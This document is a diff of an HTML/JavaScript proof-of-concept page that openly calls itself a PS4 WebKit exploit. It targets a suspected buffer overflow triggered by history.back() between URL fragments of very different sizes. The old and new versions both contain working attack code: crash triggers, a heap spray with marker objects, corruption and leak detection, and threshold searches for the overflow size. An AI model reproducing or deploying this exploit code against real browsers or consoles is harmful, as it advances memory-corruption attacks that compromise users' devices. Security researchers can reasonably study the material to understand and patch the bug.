@@ -2,39 +2,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Controlled Fragment Overflow</title>
-<style>
-body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
-button { 
-  display: block; 
-  margin: 10px 0; 
-  padding: 12px 20px; 
-  background: #2a2a2a; 
-  color: #0f0; 
-  border: 1px solid #0f0;
-  cursor: pointer;
-  font-size: 14px;
-}
-button:hover { background: #3a3a3a; }
-#log { 
-  margin-top: 20px; 
-  white-space: pre-wrap; 
-  font-size: 12px;
-  border-top: 1px solid #0f0;
-  padding-top: 10px;
-  max-height: 600px;
-  overflow-y: auto;
-}
-.critical { color: #ff0; }
-.success { color: #0ff; }
-.warn { color: #f80; }
-</style>
+<title>PS4 WebKit – Fragment Size Mismatch Overflow</title>
+
 </head>
 <body>
-<h2>PS4 WebKit – Controlled Fragment Size Exploit</h2>
-<button onclick="runSizeProbe()">PROBE – Find exact threshold</button>
-<button onclick="runControlledCrash()">EXPLOIT – Controlled crash point</button>
-<button onclick="runLeakAttempt()">LEAK – Attempt data leak before crash</button>
+<h2>🎯 PS4 WebKit – Fragment Size Mismatch Exploit</h2>
+<h3>Bug: Buffer overflow during back() navigation with mismatched fragment sizes</h3>
+
+<button onclick="runMinimalCrash()">TEST 1 – Minimal crash (2 entries only)</button>
+<button onclick="runSprayCorruption()">TEST 2 – Spray corruption detection</button>
+<button onclick="runControlledOverflow()">TEST 3 – Controlled overflow size</button>
+
 <div id="log"></div>
 
 <script>
@@ -47,235 +25,170 @@ function log(m, cls=""){
 }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-let heap = [];
+let spray = [];
 let popstateCount = 0;
-let totalFragmentSize = 0;
 
 window.addEventListener("popstate", (e) => {
   popstateCount++;
-  const state = e.state ? JSON.stringify(e.state).slice(0,80) : "null";
   const hashLen = location.hash.length;
-  log(`[POPSTATE #${popstateCount}] state=${state}, hash.length=${hashLen}`, "success");
+  const stateStr = e.state ? JSON.stringify(e.state).slice(0,60) : "null";
+  log(`[POPSTATE #${popstateCount}] hash.length=${hashLen}, state=${stateStr}`, "success");
 });
 
 // -------------------------------------------------
-// PROBE – Binary search for exact threshold
+// TEST 1 – Absolute minimal crash case
 // -------------------------------------------------
-async function runSizeProbe(){
+async function runMinimalCrash(){
   logEl.textContent = "";
-  heap = [];
   popstateCount = 0;
-  totalFragmentSize = 0;
   
-  log("=== SIZE THRESHOLD PROBE ===", "critical");
-  log("Strategy: Binary search for crash threshold\n");
+  log("=== TEST 1 – MINIMAL CRASH ===", "critical");
+  log("Hypothesis: back() from large→small fragment causes overflow\n");
   
-  // Test different total sizes
-  const testSizes = [
-    { entries: 10, size: 500000 },   // 5 MB total
-    { entries: 10, size: 400000 },   // 4 MB total  
-    { entries: 10, size: 300000 },   // 3 MB total
-    { entries: 10, size: 200000 },   // 2 MB total
-    { entries: 10, size: 100000 }    // 1 MB total
-  ];
-  
-  for(const test of testSizes){
-    log(`\n[TEST] ${test.entries} entries × ${test.size} bytes = ${(test.entries * test.size / 1024 / 1024).toFixed(2)} MB`, "warn");
-    
-    totalFragmentSize = 0;
-    for(let i=0; i<test.entries; i++){
-      const fragment = "P".repeat(test.size);
-      totalFragmentSize += test.size;
-      
-      history.pushState({
-        test: "probe",
-        entry: i,
-        size: test.size
-      }, "", "#"+fragment);
-      
-      await sleep(2);
-    }
-    
-    log(`  Total accumulated: ${(totalFragmentSize / 1024 / 1024).toFixed(2)} MB`);
-    log(`  Triggering back()...`, "critical");
-    
-    await sleep(50);
-    history.back();
-    await sleep(100);
-    
-    log(`  ✓ Survived`, "success");
-    
-    // Clear for next test
-    for(let i=0; i<test.entries-1; i++){
-      history.back();
-      await sleep(1);
-    }
-  }
-  
-  log("\n=== PROBE COMPLETE ===");
-  log(`If this completed, threshold is > 5 MB`, "warn");
-}
-
-// -------------------------------------------------
-// CONTROLLED CRASH – Target exact size
-// -------------------------------------------------
-async function runControlledCrash(){
-  logEl.textContent = "";
-  heap = [];
-  popstateCount = 0;
-  totalFragmentSize = 0;
-  
-  log("=== CONTROLLED CRASH TEST ===", "critical");
-  log("Strategy: Build to threshold, then trigger with controlled data\n");
-  
-  // Phase 1: Build up close to threshold with small entries
-  log("[PHASE 1] Building base with small entries");
-  const BASE_ENTRIES = 40;
-  const SMALL_SIZE = 1000;
-  
-  for(let i=0; i<BASE_ENTRIES; i++){
-    const fragment = String.fromCharCode(65 + (i % 26)).repeat(SMALL_SIZE);
-    totalFragmentSize += SMALL_SIZE;
-    
-    history.pushState({
-      phase: 1,
-      entry: i,
-      marker: String.fromCharCode(65 + (i % 26))
-    }, "", "#"+fragment);
-    
-    if(i % 10 === 0) log(`  Entry ${i}: ${(totalFragmentSize / 1024).toFixed(1)} KB total`);
-    await sleep(2);
-  }
-  
-  log(`\n[PHASE 2] Adding critical-size entries`, "warn");
-  
-  // Phase 2: Add progressively larger entries
-  const criticalSizes = [100000, 200000, 300000, 400000, 500000];
-  
-  for(let i=0; i<criticalSizes.length; i++){
-    const size = criticalSizes[i];
-    const marker = "CRITICAL_" + i;
-    const fragment = "X".repeat(size);
-    
-    totalFragmentSize += size;
-    
-    log(`  Entry ${BASE_ENTRIES + i}: ${marker} (${(size/1024).toFixed(0)} KB) → Total: ${(totalFragmentSize/1024/1024).toFixed(2)} MB`, "critical");
-    
-    history.pushState({
-      phase: 2,
-      entry: BASE_ENTRIES + i,
-      marker: marker,
-      size: size
-    }, "", "#"+fragment);
-    
-    await sleep(50);
-    
-    // Try back() after each large entry
-    log(`    Testing back()...`);
-    history.back();
-    await sleep(100);
-    
-    if(popstateCount > 0){
-      log(`    ✓ Back survived, popstate received`, "success");
-      popstateCount = 0;
-      
-      // Go forward again
-      history.forward();
-      await sleep(50);
-    }
-  }
-  
-  log("\n=== CONTROLLED CRASH END ===");
-}
-
-// -------------------------------------------------
-// LEAK ATTEMPT – Try to read OOB before crash
-// -------------------------------------------------
-async function runLeakAttempt(){
-  logEl.textContent = "";
-  heap = [];
-  popstateCount = 0;
-  totalFragmentSize = 0;
-  
-  log("=== LEAK ATTEMPT ===", "critical");
-  log("Strategy: Fill history, spray objects, observe data in popstate\n");
-  
-  // Spray recognizable objects
-  log("[SPRAY] Creating marker objects");
-  const MARKER = "LEAK_MARKER_";
-  const spray = [];
-  for(let i=0; i<500; i++){
-    spray.push({
-      id: i,
-      marker: MARKER + i.toString(16).padStart(8, "0"),
-      padding: "Z".repeat(1000)
-    });
-  }
-  log(`  Created ${spray.length} spray objects with markers`);
-  
+  log("[STEP 1] Create small fragment entry (100 bytes)");
+  history.pushState({id: 0, size: 100}, "", "#"+"A".repeat(100));
   await sleep(50);
   
-  // Build history with controlled sizes
-  log("\n[FILL] Building history");
-  const sizes = [];
-  let size = 1000;
+  log("[STEP 2] Create LARGE fragment entry (500,000 bytes)", "warn");
+  history.pushState({id: 1, size: 500000}, "", "#"+"B".repeat(500000));
+  await sleep(50);
   
-  for(let i=0; i<30; i++){
-    const fragment = "H".repeat(size);
-    totalFragmentSize += size;
-    sizes.push(size);
-    
-    history.pushState({
-      entry: i,
-      expectedSize: size,
-      total: totalFragmentSize
-    }, "", "#"+fragment);
-    
-    if(i % 5 === 0) log(`  Entry ${i}: ${(totalFragmentSize/1024/1024).toFixed(2)} MB total`);
-    
-    size += 50000; // Grow 50 KB per entry
-    await sleep(2);
+  log("\n[TRIGGER] Executing back() from large → small", "critical");
+  log("Expected: Crash due to buffer overflow");
+  log("Buffer allocated for 100 bytes, receives 500,000 bytes\n");
+  
+  await sleep(100);
+  history.back();
+  await sleep(500);
+  
+  log("=== TEST 1 END (should not reach) ===");
+}
+
+// -------------------------------------------------
+// TEST 2 – Spray and detect corruption
+// -------------------------------------------------
+async function runSprayCorruption(){
+  logEl.textContent = "";
+  popstateCount = 0;
+  spray = [];
+  
+  log("=== TEST 2 – SPRAY CORRUPTION ===", "critical");
+  log("Strategy: Spray objects, trigger overflow, detect corruption\n");
+  
+  log("[STEP 1] Create small fragment entry");
+  history.pushState({id: 0}, "", "#"+"S".repeat(100));
+  await sleep(50);
+  
+  log("[STEP 2] Spray 1000 objects with unique markers");
+  const MARKER_PREFIX = "CORRUPT_CHECK_";
+  for(let i=0; i<1000; i++){
+    spray.push({
+      id: i,
+      marker: MARKER_PREFIX + i.toString(16).padStart(8, "0"),
+      padding: new Array(100).fill(i)
+    });
   }
+  log(`  Sprayed ${spray.length} objects`);
+  await sleep(100);
   
-  log(`\n[TRIGGER] Executing back() chain`, "warn");
+  log("\n[STEP 3] Create LARGE fragment entry", "warn");
+  history.pushState({id: 1}, "", "#"+"L".repeat(400000));
+  await sleep(50);
   
-  // Execute multiple backs and check state
-  for(let i=0; i<10; i++){
-    await sleep(50);
+  log("\n[STEP 4] Check spray integrity BEFORE trigger");
+  let corruptedBefore = checkSprayIntegrity(MARKER_PREFIX);
+  log(`  Corrupted before: ${corruptedBefore}/${spray.length}`, 
+      corruptedBefore > 0 ? "critical" : "success");
+  
+  log("\n[TRIGGER] back() from large → small", "critical");
+  await sleep(100);
+  history.back();
+  await sleep(200);
+  
+  log("\n[STEP 5] Check spray integrity AFTER trigger");
+  let corruptedAfter = checkSprayIntegrity(MARKER_PREFIX);
+  log(`  Corrupted after: ${corruptedAfter}/${spray.length}`, 
+      corruptedAfter > 0 ? "critical" : "success");
+  
+  if(corruptedAfter > corruptedBefore){
+    log(`\n🚨 CORRUPTION CONFIRMED: ${corruptedAfter - corruptedBefore} new corruptions`, "critical");
     
-    const beforeHash = location.hash.length;
-    log(`\nBack #${i+1}: current hash length = ${beforeHash}`);
-    
-    history.back();
-    await sleep(100);
-    
-    const afterHash = location.hash.length;
-    log(`  After: hash length = ${afterHash}`);
-    
-    // Check if hash contains spray marker
-    if(location.hash.includes(MARKER)){
-      log(`  🚨 LEAK DETECTED: Hash contains spray marker!`, "critical");
-      const idx = location.hash.indexOf(MARKER);
-      log(`  Leaked data: ${location.hash.slice(idx, idx+50)}`, "critical");
-    }
-    
-    // Check state object
-    if(window.history.state){
-      const stateStr = JSON.stringify(window.history.state);
-      if(stateStr.includes(MARKER)){
-        log(`  🚨 LEAK DETECTED: State contains spray marker!`, "critical");
-        log(`  State: ${stateStr.slice(0, 200)}`, "critical");
+    // Show first few corruptions
+    for(let i=0; i<spray.length && i<10; i++){
+      if(spray[i].marker !== MARKER_PREFIX + i.toString(16).padStart(8, "0")){
+        log(`  Object ${i}: marker="${spray[i].marker}"`, "critical");
       }
     }
   }
   
-  log("\n=== LEAK ATTEMPT END ===");
+  log("\n=== TEST 2 END ===");
 }
 
-log("Ready. Tests ordered by increasing risk:");
-log("1. PROBE - safest, finds threshold");
-log("2. EXPLOIT - medium risk, controlled crash");
-log("3. LEAK - highest risk, attempts data leak");
+function checkSprayIntegrity(prefix){
+  let corrupted = 0;
+  for(let i=0; i<spray.length; i++){
+    const expected = prefix + i.toString(16).padStart(8, "0");
+    if(spray[i].marker !== expected){
+      corrupted++;
+    }
+  }
+  return corrupted;
+}
+
+// -------------------------------------------------
+// TEST 3 – Controlled overflow size
+// -------------------------------------------------
+async function runControlledOverflow(){
+  logEl.textContent = "";
+  popstateCount = 0;
+  
+  log("=== TEST 3 – CONTROLLED OVERFLOW SIZE ===", "critical");
+  log("Strategy: Binary search for minimum overflow size\n");
+  
+  const testSizes = [
+    { small: 100, large: 100000 },   // 1000x
+    { small: 100, large: 50000 },    // 500x
+    { small: 100, large: 10000 },    // 100x
+    { small: 100, large: 1000 },     // 10x
+    { small: 100, large: 500 }       // 5x
+  ];
+  
+  for(const test of testSizes){
+    log(`\n[TEST] Small: ${test.small}, Large: ${test.large} (${(test.large/test.small).toFixed(0)}x ratio)`, "warn");
+    
+    // Clear history
+    while(history.length > 1){
+      history.back();
+      await sleep(5);
+    }
+    
+    log("  Creating entries...");
+    history.pushState({size: test.small}, "", "#"+"X".repeat(test.small));
+    await sleep(30);
+    history.pushState({size: test.large}, "", "#"+"Y".repeat(test.large));
+    await sleep(30);
+    
+    log("  Triggering back()...", "critical");
+    popstateCount = 0;
+    history.back();
+    await sleep(150);
+    
+    if(popstateCount > 0){
+      log(`  ✓ Survived (popstate received)`, "success");
+    } else {
+      log(`  ❌ Likely crashed (no popstate)`, "critical");
+      break;
+    }
+  }
+  
+  log("\n=== TEST 3 END ===");
+}
+
+log("Ready. Tests ordered by diagnostic value:");
+log("1. Minimal crash - confirms bug with 2 entries only");
+log("2. Spray corruption - detects heap corruption");
+log("3. Controlled overflow - finds minimum trigger size");
+log("\nSTART WITH TEST 1");
 </script>
 </body>
 </html>
